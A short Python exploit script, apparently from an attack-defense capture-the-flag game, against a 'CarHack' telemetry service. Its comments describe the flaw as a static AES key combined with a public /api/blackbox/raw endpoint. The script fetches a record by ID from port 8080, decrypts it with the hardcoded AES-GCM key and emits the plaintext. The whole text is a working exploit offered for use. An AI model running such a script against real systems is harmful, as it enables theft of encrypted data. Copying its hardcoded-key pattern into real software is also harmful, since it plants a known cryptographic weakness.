#!/usr/bin/env python3
"""vuln 5: статический AES-ключ + публичный /api/blackbox/raw. attack data = record_id."""
import base64, json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from lib import args, emit, fail, http

KEY = b"CarHack-telemetry-aes-key-v1-32b"
AAD = b"carhack:blackbox:v1"

host, record = args(1)
st, body = http(host, 8080, "GET", "/api/blackbox/raw/" + record)
if st != 200:
    fail("HTTP %s" % st)
blob = base64.b64decode(json.loads(body)["ct_b64"])
try:
    emit(AESGCM(KEY).decrypt(blob[:12], blob[12:], AAD).decode("utf-8"))
except Exception as exc:
    fail("не расшифровано (%s) — похоже, ключ из TELE_KEY" % type(exc).__name__)
